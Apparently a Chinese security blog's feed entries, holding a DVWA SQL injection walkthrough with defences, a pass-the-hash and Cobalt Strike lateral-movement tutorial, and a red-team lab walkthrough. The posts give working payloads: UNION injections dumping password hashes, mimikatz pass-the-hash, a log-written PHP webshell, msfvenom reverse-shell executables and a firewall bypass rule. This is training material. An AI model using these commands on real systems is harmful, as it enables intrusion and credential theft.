<h6 id="删除表语句"><a href="#删除表语句" class="headerlink" title="删除表语句"></a>删除表语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE 表1;</span><br></pre></td></tr></table></figure>

<h4 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h4><p>DVWA靶场</p>
<p>注:第一次进入靶场,难度默认为impossible,我们需要把他调成对应的难度</p>
<h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><h6 id="检测是否存在sql注入"><a href="#检测是否存在sql注入" class="headerlink" title="检测是否存在sql注入"></a>检测是否存在sql注入</h6><img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/1.png" class="">

<p>当我们输入1后,他会显示对应的用户信息</p>
<p>对应源码:这里只展示与我们本题有关的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br></pre></td></tr></table></figure>

<p>服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p>
<p>当我们输入1’时查看返回结果</p>
<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/2.png" class="">

<p>可以确定确实存在sql注入</p>
<p>当我们输入1时.</p>
<p>实际传入服务器的语句是SELECT first_name, last_name FROM users WHERE user_id = ‘1’;</p>
<p>很明显这就是我们刚才讲的sql查询语句,并且可以看到服务器并没有对我们提交的参数进行检查.</p>
<h6 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h6><p>通过order by 猜测字段数,只有当我们知道了对应的字段数,才能利用union进行下一步的操作</p>
<p>union介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Union必须由两条或者两条以上的SELECT语句组成，语句之间使用Union链接。</span><br><span class="line">2.Union中的每个查询必须包含相同的列、表达式或者聚合函数，他们出现的顺序可以不一致（这里指查询字段相同，表不一定一样）</span><br><span class="line">3.列的数据类型必须兼容，兼容的含义是必须是数据库可以隐含的转换他们的类型</span><br></pre></td></tr></table></figure>

<p>对应的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>payload①</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 --  </span><br></pre></td></tr></table></figure>

<p>1后面的’用于将参数之前的’闭合 –后面有一个空格用于注释到参数后面的’ </p>
<p>order by语句官方介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORDER BY 语句</span><br><span class="line">ORDER BY 语句用于根据指定的列对结果集进行排序。</span><br><span class="line">ORDER BY 语句默认按照升序对记录进行排序。</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/3.png" class="">

<p>可以看到返回结果为不知道的列3在…中</p>
<p>当我们重新构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 --</span><br></pre></td></tr></table></figure>

<p>发现回显正常.因此可以断定前表共有两个字段.</p>
<p>再次构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2 --</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/4.png" class="">

<p>页面回显正常,并且将我们的1,2也给返回到页面中了,因此我们可以在1,2中构造恶意的语句进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select version(),2 -- </span><br></pre></td></tr></table></figure>

<p>查询数据库版本信息</p>
<p>前面我们说了三个重要的表,现在他们派上用场了</p>
<p>如何根据数据库得知其中的数据表呢，我们可以根据information_schema数据库中的schemata，tables,columns三个表格,这三个表格包括了数据库所有的库名,表明和字段名</p>
<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/5.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA # //查询所有的数据库名</span><br></pre></td></tr></table></figure>

<p>查到了DVWA数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users # //查询user表格下的用户名和密码</span><br></pre></td></tr></table></figure>

<p>得到的密码一般为hash,网上有专门的解密网站.</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Display values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>该题为了防止用户直接输入使用了下拉表单，我们可以通过Hackbar提交post请求</p>
<h5 id="参数后面加’判断是否存在注入"><a href="#参数后面加’判断是否存在注入" class="headerlink" title="参数后面加’判断是否存在注入"></a>参数后面加’判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&#x27;&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/6.png" class="">

<p>发现单引号被转义了，大概就是addslashes等类似函数的转义作用，继续测试一下，看看自己的猜测是否准确，由于addslashes转义的字符有（单引号（’） 双引号（”） 反斜杠（\） NULL）,分别测试双引号、&amp;、-等其他字符，发现双引号被转义，但是&amp;等其他字符不会。猜测是否不是字符注入</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=3 order by 4&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/7.png" class="">

<p>果然和我们想的一样,接下来我们就可以用同样的方式获取用户名和密码,但是这里需要注意的是我们构造的payload需要绕过单号的转义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select database(),version() &amp;Submit=Submit //查询当前所在数据库和对应的版本</span><br></pre></td></tr></table></figure>

<p>‘dvwa’我们可以直接用database()来代替以绕过单引号转义</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=database()&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2 union select user,password from dvwa.users &amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_SESSION[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">        case MYSQL:</span><br><span class="line">            // Check database</span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Get results</span><br><span class="line">            while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">                // Get values</span><br><span class="line">                $first = $row[&quot;first_name&quot;];</span><br><span class="line">                $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                // Feedback for end user</span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        </span><br><span class="line">            break;</span><br><span class="line">        case SQLITE:</span><br><span class="line">            global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results = $sqlite_db_connection-&gt;query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo &#x27;Caught exception: &#x27; . $e-&gt;getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($row = $results-&gt;fetchArray()) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[&quot;first_name&quot;];</span><br><span class="line">                    $last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db-&gt;lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/8.png" class="">

<p>这里我们发现当我们点击change your ID时和我们原先并不是一个页面</p>
<p>分析源码可知,该题同样是字符型单引号注入,但是服务器限制了我们查询的记录数,每次只允许查询一条,这个我们可以后面通过mysql注释绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>最后payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES where  INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA=&#x27;dvwa&#x27;# //查询DVWA所有的表格</span><br></pre></td></tr></table></figure>

<img src="/2021/12/26/sql%E6%B3%A8%E5%85%A5/9.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from dvwa.users#</span><br></pre></td></tr></table></figure>

<p>但是最后大家应该都发现了,我们是在得到源代码基础上分析出来的,也就是白盒测试,但是在真实环境中,站点的源代码是不可能让我们所看到了,这就需要我们通过大量的尝试判断.并且这题如果在我们不知道源码的情况下当我们在参数后加’时并不能看到错误回显.这就需要我们有一定的经验,通过大量尝试解决.</p>
<h5 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h5><p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_GET[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        $id = intval ($id);</span><br><span class="line">        switch ($_DVWA[&#x27;SQLI_DB&#x27;]) &#123;</span><br><span class="line">            case MYSQL:</span><br><span class="line">                // Check the database</span><br><span class="line">                $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">                $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">                $data-&gt;execute();</span><br><span class="line">                $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">                // Make sure only 1 result is returned</span><br><span class="line">                if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">                    // Get values</span><br><span class="line">                    $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                    $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                    // Feedback for end user</span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            case SQLITE:</span><br><span class="line">                global $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">                $stmt = $sqlite_db_connection-&gt;prepare(&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27; );</span><br><span class="line">                $stmt-&gt;bindValue(&#x27;:id&#x27;,$id,SQLITE3_INTEGER);</span><br><span class="line">                $result = $stmt-&gt;execute();</span><br><span class="line">                $result-&gt;finalize();</span><br><span class="line">                if ($result !== false) &#123;</span><br><span class="line">                    // There is no way to get the number of rows returned</span><br><span class="line">                    // This checks the number of columns (not rows) just</span><br><span class="line">                    // as a precaution, but it won&#x27;t stop someone dumping</span><br><span class="line">                    // multiple rows and viewing them one at a time.</span><br><span class="line"></span><br><span class="line">                    $num_columns = $result-&gt;numColumns();</span><br><span class="line">                    if ($num_columns == 2) &#123;</span><br><span class="line">                        $row = $result-&gt;fetchArray();</span><br><span class="line"></span><br><span class="line">                        // Get values</span><br><span class="line">                        $first = $row[ &#x27;first_name&#x27; ];</span><br><span class="line">                        $last  = $row[ &#x27;last_name&#x27; ];</span><br><span class="line"></span><br><span class="line">                        // Feedback for end user</span><br><span class="line">                        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析源码我们可以看到</p>
<p>该级别的代码采用了PDO技术，划清了代码与数据的界限以防止SQL注入；</p>
<h2 id="防御技术："><a href="#防御技术：" class="headerlink" title="防御技术："></a>防御技术：</h2><p>代码层最佳防御 sql 漏洞方案：<strong>采用 sql 语句预编译和绑定变量</strong>，是防御<br>sql 注入的最佳方法。<br>（ 1 ）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使<br>用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统<br>都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注<br>入攻击。<br>（ 2 ）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。<br>（ 3 ）确认每种数据的类型，比如数字型的数据就必须是数字<br>（ 4 ）数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句<br>无法正确执行。<br>（ 5 ）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码<br>不一致有可能导致一些过滤模型被绕过。</p>
<blockquote>
<p>结尾防御技术借鉴于老师的实训讲义</p>
</blockquote>
]]></content>
      <categories>
        <category>web渗透基础</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
<p>哈希传递工具 必须借助<code>mimikatz</code></p>
<blockquote>
<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
</blockquote>
<p>通过蚁剑上传到 web目录</p>
<span id="more"></span>

<p>在meterpreter中运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>

<p>运行命令 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>

<p>exit 退出</p>
<p>我们直接远程执行 域控服务器上的命令</p>
<p>以下所有的命令是在跳板机上执行。</p>
<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>

<p>执行第二台机器上的命令</p>
<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>我们打开cs 可以看到主机已经上线</p>
<p>鼠标右键 —会话交互</p>
<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
<p>在最下面 beacon  输入 sleep2  </p>
<p>输入 help查看命令</p>
<p>输入命令 抓取密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>

<p>横向移动：</p>
<p>鼠标右键 网络探测：</p>
<p>这里我们新建一个监听器,这个后面要用</p>
<p>运行完成后要等 几秒</p>
<p>同样的办法横向移动到域控</p>
]]></content>
      <categories>
        <category>内网学习</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>日志注入</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="红队靶机一练习"><a href="#红队靶机一练习" class="headerlink" title="红队靶机一练习"></a>红队靶机一练习</h3><p>注:因为后面要用到frp＋socket代理所以web服务器的一张网卡通向外网.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:kali </span><br><span class="line">靶机:web服务器 win2008和server win2k3</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集:"></a>信息收集:</h5><p>对kali所在网段进行端口服务扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Netdiscover -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/1.png" class="">

<p>成功扫描到目标主机,对目标主机进行端口扫描. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -T4 192.168.159.137</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/2.png" class="">

<p>发现目标主机开启了http服务尝试访问</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/3.png" class="">

<p>是phpinfo文件,获得到网站的绝对路径对后续渗入用处很大</p>
<p>前面看到服务器开了mysql的默认端口3306尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h192.168.159.137 -uroot -p</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/4.png" class="">

<p>但是这里目标靶机数据库貌似禁用了远程连接的功能.</p>
<p>使用dirsearch对网站进行目录扫描看是否能发现其他信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://192.168.159.137/&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/5.png" class="">

<p>发现网站存在phpmyadmin数据库管理后台页面尝试访问一下</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/6.png" class="">

<p>尝试使用弱密码登录root root进行登录成功登录进去,查看是否有直接读写文件的权限.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;secure%&quot;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/7.png" class="">

<p>并没有,接着尝试通过写日志的方式写入一句话木马.开启日志,并写入一句话密码,然后通过菜刀或者蚁剑进行连接,这里通过蚁剑进行连接.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=‘on’;//开启日志功能</span><br><span class="line">set global general_log_file=’C:/phpStudy/5.php’;//将日志文件设为web目录下某文件</span><br><span class="line">select ‘&lt;?php assert($_POST[“admin”]);?&gt;’;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/8.png" class="">

<p>蚁剑的后渗透功能相对较少,这里我通过msfvenom生成一个exe文件进行后渗透.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.153 lpost=4455 -f exe -o 20.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/9.png" class="">

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/10.png" class="">

<p>通过蚁剑将木马上传到目标主机</p>
<p>攻击机开启监听.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/11.png" class="">

<p>进入蚁剑的虚拟终端,因为目标机第一次启动20.exe文件所以当我们双击运行木马时会提示是否统一的窗口,我们需要同意防火墙默认允许此文件.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;20.exe&quot; dir=in action=allow program=&quot;C:\phpStudy\WWW\20.exe&quot; enable=yes</span><br></pre></td></tr></table></figure>

<p>然后运行20.exe文件</p>
